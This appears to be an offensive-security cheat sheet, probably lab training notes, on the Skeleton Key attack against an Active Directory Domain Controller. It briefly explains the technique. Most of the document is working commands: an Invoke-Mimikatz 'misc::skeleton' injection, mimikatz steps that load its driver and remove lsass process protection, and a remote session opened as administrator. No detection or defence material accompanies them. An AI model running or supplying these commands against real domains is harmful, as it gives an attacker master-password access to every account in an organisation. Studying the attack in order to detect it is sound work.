# Skeleton Key

- [Skeleton Key](#skeleton-key)
  - [General](#general)
  - [Exploitation](#exploitation)

## General

- Patch a Domain Controller (lsass process) so that it allows access as any user with a single password
- Discovered in malware named Skeleton Key malware
- All publicly known methods are NOT persistent accross reboots
- Mimikatz to the rescue

## Exploitation

```powershell
# Inject skeleton key on DC of choice with default password of 'mimikatz'. DA privs required
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

# If lsass is running as procted process we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of target DC. Very noisy!
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-

# Access machine with valid username
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\administrator
```